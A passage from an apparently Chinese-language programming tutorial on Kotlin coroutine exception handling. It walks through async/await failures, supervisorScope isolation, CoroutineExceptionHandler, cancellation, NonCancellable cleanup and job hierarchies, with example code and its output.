    <span class="hljs-keyword">val</span> deferredResult: Deferred&lt;String&gt; = async {
        println(<span class="hljs-string">"Inside async: About to fail..."</span>)
        delay(<span class="hljs-number">500</span>)
        <span class="hljs-keyword">throw</span> IllegalStateException(<span class="hljs-string">"Async operation failed!"</span>)
        <span class="hljs-string">"This will never be returned"</span>
    }
    println(<span class="hljs-string">"After async"</span>)
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 异常在调用 await() 时抛出</span>
        <span class="hljs-keyword">val</span> result = deferredResult.await()
        println(<span class="hljs-string">"Result: <span class="hljs-variable">$result</span>"</span>)
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-comment">// ✅ 正确捕获异常</span>
        println(<span class="hljs-string">"Caught exception on await: <span class="hljs-subst">${e.message}</span>"</span>)
    }
    println(<span class="hljs-string">"Main finished"</span>)
}
</code></pre>
<pre><code class="hljs language-vbnet" lang="vbnet">
Before <span class="hljs-keyword">async</span>
After <span class="hljs-keyword">async</span>
Inside <span class="hljs-keyword">async</span>: About <span class="hljs-keyword">to</span> fail...
Caught exception <span class="hljs-keyword">on</span> <span class="hljs-built_in">await</span>: <span class="hljs-keyword">Async</span> operation failed!
Main finished
Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">"main"</span> java.lang.IllegalStateException: <span class="hljs-keyword">Async</span> operation failed!
... (堆栈信息) ...
</code></pre>
<p>注意：虽然 <code>catch</code> 块成功捕获了异常，但由于顶层异常未处理，程序仍会崩溃。</p>
<p>这里正好体现了协程异常向上传播的特性。</p>
<p>若要完全避免崩溃，需在顶层添加异常处理逻辑，或使用 <code>CoroutineScope</code> 的异常处理器。</p>
<p>或者，你继续往下看！</p>
<h3 data-id="heading-8">替代方案：在 async 内部使用 try-catch</h3>
<p>在 <code>async</code> 内部处理异常，能实现错误本地化，并可根据处理逻辑从 <code>catch</code> 块返回结果。这种情况下，<code>Deferred</code> 对象返回后不会再抛出异常——因为异常已经提前处理完毕。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Before async"</span>)
    <span class="hljs-keyword">val</span> deferredResult = async {
        <span class="hljs-keyword">try</span> {
            println(<span class="hljs-string">"Inside async: About to fail..."</span>)
            delay(<span class="hljs-number">500</span>)
            <span class="hljs-keyword">throw</span> IllegalStateException(<span class="hljs-string">"Async operation failed!"</span>)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            println(<span class="hljs-string">"Caught exception inside async: <span class="hljs-subst">${e.message}</span>"</span>)
            <span class="hljs-keyword">return</span><span class="hljs-symbol">@async</span> <span class="hljs-string">"Fallback result"</span> <span class="hljs-comment">// 异常处理后返回默认结果</span>
        }
        <span class="hljs-string">"This will never be returned"</span>
    }
    println(<span class="hljs-string">"After async"</span>)
    <span class="hljs-keyword">val</span> result = deferredResult.await()
    println(<span class="hljs-string">"Result: <span class="hljs-variable">$result</span>"</span>)
    println(<span class="hljs-string">"Main finished"</span>)
}
</code></pre>
<pre><code class="hljs language-vbnet" lang="vbnet">
Before <span class="hljs-keyword">async</span>
After <span class="hljs-keyword">async</span>
Inside <span class="hljs-keyword">async</span>: About <span class="hljs-keyword">to</span> fail...
Caught exception inside <span class="hljs-keyword">async</span>: <span class="hljs-keyword">Async</span> operation failed!
<span class="hljs-symbol">Result:</span> Fallback result
Main finished
</code></pre>
<p>此时程序不会崩溃，因为异常已在 <code>async</code> 内部处理完毕，<code>await()</code> 能正常获取到 <code>catch</code> 块返回的结果。</p>
<h2 data-id="heading-9">场景三：父子协程关系</h2>
<p>这是结构化并发的核心价值所在。<code>coroutineScope</code> 会等待所有子协程完成，一旦任意一个子协程失败，整个作用域会立即取消其他所有子协程，随后自身也失败。</p>
<h3 data-id="heading-10">一个子协程失败，全作用域取消</h3>
<p>这种机制能防止程序进入不一致状态。如果某个关键操作失败，取消整个关联操作远比让其他部分继续运行更安全。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting the scope..."</span>)
    <span class="hljs-keyword">try</span> {
        coroutineScope { <span class="hljs-comment">// 创建新作用域</span>
            launch {
                <span class="hljs-keyword">try</span> {
                    println(<span class="hljs-string">"Child 1: Working for 1000ms..."</span>)
                    delay(<span class="hljs-number">1000</span>)
                    println(<span class="hljs-string">"Child 1: Finished."</span>) <span class="hljs-comment">// 不会执行</span>
                } <span class="hljs-keyword">finally</span> {
                    println(<span class="hljs-string">"Child 1: I was cancelled!"</span>)
                }
            }

            launch {
                println(<span class="hljs-string">"Child 2: Working for 500ms then failing..."</span>)
                delay(<span class="hljs-number">500</span>)
                <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Child 2 failed!"</span>)
            }
        }
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-comment">// Child 2 的异常向上传播到父作用域并被捕获</span>
        println(<span class="hljs-string">"Caught exception in parent scope: <span class="hljs-subst">${e.message}</span>"</span>)
    }
    println(<span class="hljs-string">"Scope finished."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Starting the scope...
Child 1: Working for 1000ms...
Child 2: Working for 500ms then failing...
Child 1: I was cancelled!
Caught exception in parent scope: Child 2 failed!
Scope finished.
</code></pre>
<p>可以看到，Child 2 失败后，Child 1 还没完成工作就被立即取消了。</p>
<h3 data-id="heading-11">嵌套作用域的异常传播</h3>
<p>在协程作用域内嵌套另一个 <code>coroutineScope</code> 时，内层作用域会遵循同样的“失败即取消”规则。</p>
<p>如果父作用域失败，内层作用域会被取消；反之，内层作用域的任意子协程失败，也会导致内层所有子协程取消，并将异常传播到父作用域。这种嵌套结构确保了整个任务树的一致性和可控性。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting the scope..."</span>)
    launch {
        println(<span class="hljs-string">"Parent: Working for 500ms then failing..."</span>)
        delay(<span class="hljs-number">500</span>)
        <span class="hljs-comment">// 抛出一个上层异常</span>
        <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Parent failed!"</span>)
    }
    <span class="hljs-keyword">try</span> {
        coroutineScope { <span class="hljs-comment">// 创建新作用域</span>
            launch {
                <span class="hljs-keyword">try</span> {
                    println(<span class="hljs-string">"Child 1: Working for 1000ms..."</span>)
                    delay(<span class="hljs-number">1000</span>)
                    println(<span class="hljs-string">"Child 1: Finished."</span>) <span class="hljs-comment">// 不会执行</span>
                } <span class="hljs-keyword">finally</span> {
                    println(<span class="hljs-string">"Child 1: I was cancelled!"</span>)
                }
            }
        }
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-comment">// 上层异常导致协程取消并被捕获</span>
        println(<span class="hljs-string">"Caught exception in scope: <span class="hljs-subst">${e.message}</span>"</span>)
    }
}
</code></pre>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">Starting</span> <span class="hljs-string">the</span> <span class="hljs-string">scope...</span>
<span class="hljs-attr">Parent:</span> <span class="hljs-string">Working</span> <span class="hljs-string">for</span> <span class="hljs-string">500ms</span> <span class="hljs-string">then</span> <span class="hljs-string">failing...</span>
<span class="hljs-attr">Child 1:</span> <span class="hljs-string">Working</span> <span class="hljs-string">for</span> <span class="hljs-string">1000ms...</span>
<span class="hljs-attr">Child 1:</span> <span class="hljs-string">I</span> <span class="hljs-string">was</span> <span class="hljs-string">cancelled!</span>
<span class="hljs-attr">Caught exception in scope:</span> <span class="hljs-string">Parent</span> <span class="hljs-string">job</span> <span class="hljs-string">is</span> <span class="hljs-string">Cancelling</span>
<span class="hljs-string">...</span>
</code></pre>
<h2 data-id="heading-12">场景四：隔离</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5848ba38d0e44e79ebe58c3d2477b6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769559965&amp;x-signature=8DBhvOgNfjptcIN9%2F8uT1XqcLgg%3D" alt="1.jpg" loading="lazy"/></p>
<p>如果希望某个子协程的失败不影响其他兄弟协程，就用 <code>supervisorScope</code>——它会覆盖父作用域的取消策略。</p>
<h3 data-id="heading-13">使用思路</h3>
<p><code>supervisorScope</code> 中直接子协程的异常，不会触发父作用域或兄弟协程的取消。这种特性在 UI 应用中特别实用，比如多个独立任务并行运行时，一个任务出错不该导致整个界面卡死。</p>
<p>重要提示：监督机制仅对<strong>直接子协程</strong>生效。</p>
<p>这一点我发现很多开发者包括我的同事也忽略了！你可以这样记住：</p>
<p>爸爸只管儿子，管不着孙子！</p>
<p>孙子谁管？儿子管！</p>
<p>当然，如果在 <code>supervisorScope</code> 内部嵌套 <code>coroutineScope</code>，这个内层作用域仍遵循“失败即取消”规则——其内部任意子协程失败，都会导致内层所有子协程被取消。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting the supervisor scope..."</span>)
    <span class="hljs-keyword">try</span> {
        supervisorScope { <span class="hljs-comment">// 子协程失败隔离</span>
            launch {
                println(<span class="hljs-string">"Child 1: Working for 500ms then failing..."</span>)
                delay(<span class="hljs-number">500</span>)
                <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Child 1 failed!"</span>)
            }

            launch {
                <span class="hljs-keyword">try</span> {
                    println(<span class="hljs-string">"Child 2: Working for 1000ms..."</span>)
                    delay(<span class="hljs-number">1000</span>)
                    println(<span class="hljs-string">"Child 2: Finished successfully!"</span>) <span class="hljs-comment">// 会执行</span>
                } <span class="hljs-keyword">finally</span> {
                    println(<span class="hljs-string">"Child 2: I was NOT cancelled!"</span>)
                }
            }
        }
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-comment">// ❌ 不会执行，supervisorScope 不传播子协程异常</span>
        println(<span class="hljs-string">"Caught exception in parent scope: <span class="hljs-variable">$e</span>"</span>)
    }
    println(<span class="hljs-string">"Supervisor scope finished."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Starting the supervisor scope...
Child 1: Working for 500ms then failing...
Child 2: Working for 1000ms...
Exception in thread "main" java.lang.RuntimeException: Child 1 failed!
... (堆栈信息) ...
Child 2: Finished successfully!
Child 2: I was NOT cancelled!
Supervisor scope finished.
</code></pre>
<p>这里程序依然崩溃了——原因是 <code>supervisorScope</code> 只阻止取消传播（也就是不会取消其他儿子的任务），不会自动处理异常。</p>
<p>Child 1 抛出的异常未被捕获，最终导致主线程崩溃。因此，必须在 <code>supervisorScope</code> 的子协程内部手动处理异常。</p>
<h3 data-id="heading-14">正确使用 supervisorScope</h3>
<p>在 <code>supervisorScope</code> 的子协程内部添加 <code>try-catch</code>，手动处理异常。</p>
<p><em>再次用到古法捕获！你不要管老不老，关键是好使！</em></p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting the supervisor scope..."</span>)
    supervisorScope {
        <span class="hljs-comment">// Child 1 自行处理异常</span>
        launch {
            <span class="hljs-keyword">try</span> {
                println(<span class="hljs-string">"Child 1: I'm going to fail."</span>)
                delay(<span class="hljs-number">500</span>)
                <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Child 1 failed!"</span>)
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                println(<span class="hljs-string">"Caught in Child 1: <span class="hljs-subst">${e.message}</span>"</span>)
            }
        }

        <span class="hljs-comment">// Child 2 独立运行，不受影响</span>
        launch {
            println(<span class="hljs-string">"Child 2: I will succeed."</span>)
            delay(<span class="hljs-number">1000</span>)
            println(<span class="hljs-string">"Child 2: Finished successfully!"</span>)
        }
    }
    println(<span class="hljs-string">"Supervisor scope finished."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Starting the supervisor scope...
Child 1: I'm going to fail.
Child 2: I will succeed.
Caught in Child 1: Child 1 failed!
Child 2: Finished successfully!
Supervisor scope finished.
</code></pre>
<p>此时运行正常：Child 1 失败后自行处理了错误，Child 2 不受影响并顺利完成任务，同时也不会影响程序运行，一切照常！</p>
<h2 data-id="heading-15">场景五：全局异常捕获</h2>
<p><code>CoroutineExceptionHandler</code> 是协程异常处理的“最后防线”，它是一个特殊的上下文元素，可添加到顶层作用域，用于捕获所有未被其他方式处理的异常。</p>
<h3 data-id="heading-16">适用场景</h3>
<p>主要用于日志记录、错误上报或清理未处理异常，特别适合与 <code>GlobalScope</code> 或 <code>SupervisorJob</code> 配合使用。</p>
<h3 data-id="heading-17">无效场景</h3>
<p>对普通 <code>coroutineScope</code> 的子协程无效——因为 <code>coroutineScope</code> 会在子协程失败时主动取消并处理异常，不会让异常冒泡到顶层处理器。</p>
<p>但对 <code>async</code> 有效，因为其异常被封装在 <code>Deferred</code> 中，直到 <code>await()</code> 才暴露。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-comment">// 1. 创建异常处理器</span>
    <span class="hljs-keyword">val</span> handler = CoroutineExceptionHandler { _, exception -&gt;
        println(<span class="hljs-string">"Caught by CoroutineExceptionHandler: <span class="hljs-variable">$exception</span>"</span>)
    }

    <span class="hljs-comment">// 2. 创建带处理器的 SupervisorJob 作用域</span>
    <span class="hljs-keyword">val</span> scope = CoroutineScope(SupervisorJob() + handler)

    <span class="hljs-comment">// 3. 启动会失败的协程</span>
    scope.launch {
        println(<span class="hljs-string">"Child 1: Failing..."</span>)
        <span class="hljs-keyword">throw</span> AssertionError(<span class="hljs-string">"Something is wrong!"</span>)
    }

    <span class="hljs-comment">// 4. 启动不受影响的协程</span>
    scope.launch {
        delay(<span class="hljs-number">500</span>)
        println(<span class="hljs-string">"Child 2: I'm alive!"</span>)
    }

    <span class="hljs-comment">// 等待协程执行</span>
    delay(<span class="hljs-number">1000</span>)
    println(<span class="hljs-string">"Main finished."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Child 1: Failing...
Caught by CoroutineExceptionHandler: java.lang.AssertionError: Something is wrong!
Child 2: I'm alive!
Main finished.
</code></pre>
<p>处理器成功捕获了 Child 1 的异常，同时 Child 2 不受影响正常运行，且程序也正常运行，没有崩溃——这正是 <code>SupervisorJob</code> 隔离失败的特性与 <code>CoroutineExceptionHandler</code> 全局捕获的结合效果。</p>
<h2 data-id="heading-18">场景六：supervisorScope 中使用 async</h2>
<p><code>supervisorScope</code> 隔离失败的规则对 <code>async</code> 同样适用：某个 <code>async</code> 子协程失败，不会影响其他兄弟协程（无论 <code>launch</code> 还是 <code>async</code>）。</p>
<p>但 <code>async</code> 的异常仍会暂存于 <code>Deferred</code> 对象中，需在调用 <code>await()</code> 时手动处理。</p>
<h3 data-id="heading-19">使用思路</h3>
<p>这种组合适合多个独立的异步任务并行执行的场景。即使某个任务失败，其他任务仍能正常完成，且失败任务的异常可在获取结果时单独处理。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting supervisor scope with async..."</span>)
    supervisorScope {
        <span class="hljs-comment">// 会失败的 async 任务</span>
        <span class="hljs-keyword">val</span> deferredFailure = async {
            println(<span class="hljs-string">"Async 1: I will fail in 500ms."</span>)
            delay(<span class="hljs-number">500</span>)
            <span class="hljs-keyword">throw</span> IllegalStateException(<span class="hljs-string">"Failure!"</span>)
        }

        <span class="hljs-comment">// 会成功的 async 任务</span>
        <span class="hljs-keyword">val</span> deferredSuccess = async {
            println(<span class="hljs-string">"Async 2: I will succeed in 1000ms."</span>)
            delay(<span class="hljs-number">1000</span>)
            <span class="hljs-string">"Success!"</span>
        }

        <span class="hljs-comment">// 处理失败任务的异常</span>
        <span class="hljs-keyword">try</span> {
            deferredFailure.await()
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            println(<span class="hljs-string">"Caught expected failure from Async 1: <span class="hljs-subst">${e.message}</span>"</span>)
        }

        <span class="hljs-comment">// 获取成功任务的结果</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">val</span> result = deferredSuccess.await()
            println(<span class="hljs-string">"Result from Async 2: <span class="hljs-variable">$result</span>"</span>)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            println(<span class="hljs-string">"Caught unexpected failure from Async 2: <span class="hljs-variable">$e</span>"</span>)
        }
    }
    println(<span class="hljs-string">"Supervisor scope finished."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Starting supervisor scope with async...
Async 1: I will fail in 500ms.
Async 2: I will succeed in 1000ms.
Caught expected failure from Async 1: Failure!
Result from Async 2: Success!
Supervisor scope finished.
</code></pre>
<p>可以看到，<code>deferredSuccess</code> 未受 <code>deferredFailure</code> 异常影响，正常完成并返回结果；同时，<code>deferredFailure</code> 的异常在 <code>await()</code> 时被成功捕获。</p>
<h2 data-id="heading-20">场景七：取消是一种特殊的异常</h2>
<p>协程被取消时，会抛出 <code>CancellationException</code>——这是一种特殊异常，通常会被协程机制自动忽略，无需手动捕获。</p>
<h3 data-id="heading-21">使用思路</h3>
<p><code>CancellationException</code> 代表协程正常取消，是结构化并发的常规行为。虽然可以用 <code>try-catch</code> 捕获它（比如用于日志记录），但<strong>不应“吞掉”它</strong>——若捕获后需要执行逻辑，务必重新抛出，确保取消流程完整。协程的清理逻辑（如关闭资源、释放连接），最佳位置是 <code>finally</code> 块。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> job = launch {
        <span class="hljs-keyword">try</span> {
            println(<span class="hljs-string">"Job: I'm working..."</span>)
            delay(<span class="hljs-number">2000</span>) <span class="hljs-comment">// 挂起点，可响应取消</span>
            println(<span class="hljs-string">"Job: I'm done."</span>) <span class="hljs-comment">// 不会执行</span>
        } <span class="hljs-keyword">catch</span> (e: CancellationException) {
            <span class="hljs-comment">// 日志记录，必须重新抛出</span>
            println(<span class="hljs-string">"Job: I was cancelled. Re-throwing exception."</span>)
            <span class="hljs-keyword">throw</span> e
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            println(<span class="hljs-string">"Job: Caught some other exception: <span class="hljs-variable">$e</span>"</span>)
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// ✅ 清理逻辑的正确位置</span>
            println(<span class="hljs-string">"Job: Finally block executed for cleanup."</span>)
        }
    }

    delay(<span class="hljs-number">1000</span>)
    println(<span class="hljs-string">"Main: I'm tired of waiting, cancelling the job."</span>)
    job.cancelAndJoin() <span class="hljs-comment">// 取消并等待协程完成</span>
    println(<span class="hljs-string">"Main: Job has been cancelled."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Job: I'm working...
Main: I'm tired of waiting, cancelling the job.
Job: I was cancelled. Re-throwing exception.
Job: Finally block executed for cleanup.
Main: Job has been cancelled.
</code></pre>
<h2 data-id="heading-22">场景八：不可取消的清理</h2>
<p>如果 <code>finally</code> 块中的清理逻辑包含挂起函数（比如写文件、网络请求），协程被取消后，这些挂起调用会立即抛出 <code>CancellationException</code>，导致清理逻辑无法完整执行。</p>
<h3 data-id="heading-23">解决方案</h3>
<p>在 <code>finally</code> 块中，通过 <code>withContext(NonCancellable)</code> 切换上下文。</p>
<p><code>NonCancellable</code> 能保证块内代码完整执行，不受协程取消状态影响。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> job = launch {
        <span class="hljs-keyword">try</span> {
            println(<span class="hljs-string">"Job: Working..."</span>)
            delay(<span class="hljs-number">2000</span>)
        } <span class="hljs-keyword">finally</span> {
            println(<span class="hljs-string">"Job: Entering finally block."</span>)
            <span class="hljs-comment">// 切换到 NonCancellable 上下文执行挂起清理逻辑</span>
            withContext(NonCancellable) {
                println(<span class="hljs-string">"Job: Starting a suspending cleanup that takes 500ms..."</span>)
                delay(<span class="hljs-number">500</span>) <span class="hljs-comment">// 模拟耗时清理</span>
                println(<span class="hljs-string">"Job: Crucial cleanup finished."</span>)
            }
        }
    }

    delay(<span class="hljs-number">1000</span>)
    println(<span class="hljs-string">"Main: Cancelling the job."</span>)
    job.cancelAndJoin()
    println(<span class="hljs-string">"Main: Job cancelled."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Job: Working...
Main: Cancelling the job.
Job: Entering finally block.
Job: Starting a suspending cleanup that takes 500ms...
Job: Crucial cleanup finished.
Main: Job cancelled.
</code></pre>
<p>即使协程被取消，<code>NonCancellable</code> 块内的 <code>delay(500)</code> 仍能顺利执行，确保清理逻辑完成。</p>
<p>如果你需要在协程被取消之后执行一个清理任务，但是这个清理任务又是一个可挂起的函数，那么 <code>NonCancellable</code> 就再适合不过了。</p>
<h2 data-id="heading-24">场景九：嵌套作用域与异常传播细节</h2>
<p><code>coroutineScope</code>（失败即取消）和 <code>supervisorScope</code>（隔离失败）的规则，仅对<strong>直接子协程</strong>生效。</p>
<p>嵌套结构中，内层作用域的规则不会被外层覆盖——比如 <code>supervisorScope</code> 内的 <code>coroutineScope</code>，仍遵循“内部失败即全取消”。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-comment">// 顶层 supervisorScope：隔离直接子协程失败</span>
    supervisorScope {
        <span class="hljs-comment">// 直接子协程 1：正常运行</span>
        launch {
            println(<span class="hljs-string">"Supervisor's Child 1: I survived!"</span>)
        }

        <span class="hljs-comment">// 直接子协程 2：包含内层 coroutineScope</span>
        launch {
            coroutineScope { <span class="hljs-comment">// 内层遵循“失败即取消”</span>
                println(<span class="hljs-string">"Inner Scope Child: I'm about to fail!"</span>)
                delay(<span class="hljs-number">500</span>)
                <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Failure in inner scope"</span>)
            }
        }
    }
    println(<span class="hljs-string">"All done."</span>)
}
</code></pre>
<h5 data-id="heading-25">输出结果</h5>
<pre><code class="hljs language-Plain" lang="Plain">
Inner Scope Child: I'm about to fail!
Supervisor's Child 1: I survived!
Exception in thread "main" java.lang.RuntimeException: Failure in inner scope
...
</code></pre>
<p>关键结论：Supervisor's Child 1 未受影响（体现 <code>supervisorScope</code> 隔离特性）；内层 <code>coroutineScope</code> 的子协程失败后，内层作用域自身被取消（体现 <code>coroutineScope</code> 规则）；未捕获的异常最终导致程序崩溃。</p>
<h2 data-id="heading-26">场景十：任务层级详解</h2>
<p>结构化并发的核心是“任务层级（Job Hierarchy）”，可以形象理解为一棵任务树：</p>
<ul>
<li>
<p>在协程（或作用域）中启动新协程时，新协程会成为父协程的子任务；</p>
</li>
<li>
<p>父任务有两个核心责任：一是等待所有子任务完成后才会自身完成；二是若子任务失败（非 <code>supervisor</code> 场景），则取消所有其他子任务并自身失败。</p>
</li>
</ul>
<p>这种层级关系确保了协程的“结构化”，避免任务失控。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-comment">// runBlocking 是顶层父作用域</span>
    println(<span class="hljs-string">"Parent Scope: I'm the parent job."</span>)
    <span class="hljs-keyword">val</span> job1 = launch {
        println(<span class="hljs-string">"Child Job 1: I'm a child of the parent scope."</span>)
        delay(<span class="hljs-number">1000</span>)
        println(<span class="hljs-string">"Child 1: I'm done."</span>)
    }

    <span class="hljs-keyword">val</span> job2 = launch {
        println(<span class="hljs-string">"Child Job 2: I'm also a child."</span>)
        delay(<span class="hljs-number">500</span>)
        <span class="hljs-comment">// 创建孙协程（job2 的子协程）</span>
        launch {
            println(<span class="hljs-string">"Grandchild: My parent is Child 2."</span>)
            delay(<span class="hljs-number">500</span>)
            println(<span class="hljs-string">"Grandchild: I'm done."</span>)
        }
        println(<span class="hljs-string">"Child 2: I'm done."</span>)
    }

    println(<span class="hljs-string">"Parent Scope: Waiting for my children to finish."</span>)
    <span class="hljs-comment">// runBlocking 会等待所有子任务（job1、job2、孙协程）完成后才结束</span>
}
</code></pre>
<h5 data-id="heading-27">输出结果</h5>
<pre><code class="hljs language-Plain" lang="Plain">
Parent Scope: I'm the parent job.
Parent Scope: Waiting for my children to finish.
Child Job 1: I'm a child of the parent scope.
Child Job 2: I'm also a child.
Grandchild: My parent is Child 2.
Grandchild: I'm done.
Child 2: I'm done.
Child 1: I'm done.
</code></pre>
<p>可见，<code>runBlocking</code> 作为父作用域，会等待所有子协程（包括嵌套的孙协程）完成后才结束，完全遵循任务层级的约束。</p>
<h2 data-id="heading-28">场景十一：supervisorScope vs CoroutineScope(SupervisorJob())</h2>
<p>两者都基于 <code>SupervisorJob</code> 实现失败隔离，但适用场景不同：</p>
<ul>
<li>
<p><strong>supervisorScope { ... }</strong>：用于创建“局部隔离区”，适合隔离一组相关但独立的临时任务。它是一个挂起函数（<strong>这意味着它的运行需要一个协程域</strong>），会等待所有直接子协程完成；若子协程异常未被捕获，会抛出到外部作用域。</p>
</li>
<li>
<p><strong>CoroutineScope(SupervisorJob())</strong>：创建一个可复用的作用域对象（<code>它本身就是在创建一个协程域</code>），适合组件化架构（如 Android <code>ViewModel</code>、独立模块）。作用域内的直接子协程相互隔离，且作用域不会自动结束，需显式调用 <code>cancel()</code> 销毁。</p>
</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Component</span> {
    <span class="hljs-comment">// 创建带 SupervisorJob 和异常处理器的作用域</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> scope = CoroutineScope(SupervisorJob() + CoroutineExceptionHandler { _, e -&gt;
        println(<span class="hljs-string">"Component: Caught an error: <span class="hljs-variable">$e</span>"</span>)
    })

    <span class="hljs-comment">// 启动高风险任务</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startRiskyTask</span><span class="hljs-params">()</span></span> {
        scope.launch {
            println(<span class="hljs-string">"Risky Task: Starting..."</span>)
            delay(<span class="hljs-number">1000</span>)
            <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Something went wrong"</span>)
        }
    }

    <span class="hljs-comment">// 启动稳定任务</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startStableTask</span><span class="hljs-params">()</span></span> {
        scope.launch {
            println(<span class="hljs-string">"Stable Task: I'm running..."</span>)
            delay(<span class="hljs-number">1000</span>)
            println(<span class="hljs-string">"Stable Task: I finished successfully."</span>)
        }
    }

    <span class="hljs-comment">// 组件销毁时取消作用域</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"Component: Destroying and cancelling scope."</span>)
        scope.cancel()
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> component = Component()
    component.startRiskyTask()
    component.startStableTask()
    delay(<span class="hljs-number">2000</span>) <span class="hljs-comment">// 等待任务执行</span>
    component.destroy()
    delay(<span class="hljs-number">500</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Risky Task: Starting...
Stable Task: I'm running...
Component: Caught an error: java.lang.RuntimeException: Something went wrong
Stable Task: I finished successfully.
Component: Destroying and cancelling scope.
</code></pre>
<p>即使高风险任务失败，稳定任务仍正常完成；作用域保持活跃直到显式销毁，符合组件化开发的生命周期管理需求。</p>
<h3 data-id="heading-29">场景十二：处理超时</h3>
<p>长时间运行的任务可能导致资源占用或响应缓慢，协程提供了简洁的超时控制方案：</p>
<ul>
<li>
<p><strong>withTimeout(timeoutMillis) { ... }</strong>：执行代码块，若超时则抛出 <code>TimeoutCancellationException</code>，同时取消协程；</p>
</li>
<li>
<p><strong>withTimeoutOrNull(timeoutMillis) { ... }</strong>：非抛出版本，超时后返回 <code>null</code>，不会抛出异常，代码更简洁易维护。</p>
</li>
</ul>
